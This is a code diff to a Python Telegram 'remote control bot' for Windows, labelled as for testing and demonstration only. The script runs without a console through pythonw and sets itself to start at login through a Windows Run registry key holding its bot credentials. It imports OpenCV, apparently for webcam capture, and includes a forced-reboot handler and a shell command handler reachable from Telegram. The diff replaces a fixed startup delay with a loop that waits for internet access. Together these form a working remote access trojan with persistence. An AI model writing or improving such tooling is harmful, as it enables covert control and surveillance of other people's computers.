@@ -2,7 +2,7 @@
 Telegram Remote Control Bot using Telethon
 For testing and demonstration purposes only
 
-Usage: pythonw bot.py <API_ID> <API_HASH> <BOT_TOKEN> <AUTHORIZED_USER_ID> [DELAY_SECONDS]
+Usage: pythonw bot.py <API_ID> <API_HASH> <BOT_TOKEN> <AUTHORIZED_USER_ID>
 """
 
 import os
@@ -10,21 +10,28 @@ import subprocess
 import tempfile
 import time
 import sys
+import socket
 from datetime import datetime
 from telethon import TelegramClient, events
 import cv2
 import winreg
 
 # ============================================
-# STARTUP DELAY LOGIC (Top of script)
+# INTERNET CHECK LOGIC (Top of script)
 # ============================================
-# If a 5th argument is provided (like from the Registry), wait. 
-# Otherwise, default to 0 for manual runs.
-STARTUP_DELAY = int(sys.argv[5]) if len(sys.argv) == 6 else 0
+def wait_for_internet():
+    """Check for internet connection every 5 seconds before starting bot logic."""
+    while True:
+        try:
+            # Try to connect to Google's DNS to verify internet access
+            socket.create_connection(("8.8.8.8", 53), timeout=3)
+            return True
+        except OSError:
+            # Wait 5 seconds before trying again
+            time.sleep(5)
 
-if STARTUP_DELAY > 0:
-    # No print here because pythonw has no console to print to
-    time.sleep(STARTUP_DELAY)
+# Start the wait loop before anything else
+wait_for_internet()
 
 # ============================================
 # CONFIGURATION - From command line arguments
@@ -72,9 +79,8 @@ def setup_persistence():
             if not os.path.exists(pythonw_path):
                 pythonw_path = sys.executable
             
-            # HARDCODED 120: We add '120' to the registry string so it 
-            # always waits when launched by Windows, even if you ran it manually now.
-            script_path = f'"{pythonw_path}" "{current_script}" {API_ID} {API_HASH} {BOT_TOKEN} {AUTHORIZED_USER_ID} 400'
+            # Simplified path: No delay argument needed because wait_for_internet() handles it
+            script_path = f'"{pythonw_path}" "{current_script}" {API_ID} {API_HASH} {BOT_TOKEN} {AUTHORIZED_USER_ID}'
         
         # Open registry key
         key = winreg.OpenKey(
@@ -84,7 +90,7 @@ def setup_persistence():
             winreg.KEY_SET_VALUE | winreg.KEY_QUERY_VALUE
         )
         
-        # Set the registry value (Overwrite to ensure the 120 is present)
+        # Set the registry value
         winreg.SetValueEx(
             key,
             APP_NAME,
@@ -126,7 +132,7 @@ async def start_handler(event):
         return
     
     is_enabled = check_persistence()
-    persistence_msg = "✅ Enabled (120s delay)" if is_enabled else "❌ Not configured"
+    persistence_msg = "✅ Enabled (Auto-connect)" if is_enabled else "❌ Not configured"
     
     help_text = f"""
 🤖 **Remote Control Bot - Active**
@@ -198,7 +204,6 @@ async def reboot_handler(event):
         return
     await event.reply("🔄 Rebooting immediately...")
     try:
-        # Changed to /t 000 as requested
         subprocess.Popen(['shutdown', '/r', '/t', '000'], shell=True)
     except Exception as e:
         await event.reply(f"❌ Error: {str(e)}")
@@ -242,7 +247,5 @@ async def cmd_handler(event):
 # Start the bot
 # ============================================
 if __name__ == '__main__':
-    # Setup persistence (it will write the 120s delay into registry)
     setup_persistence()
     bot.run_until_disconnected()
-
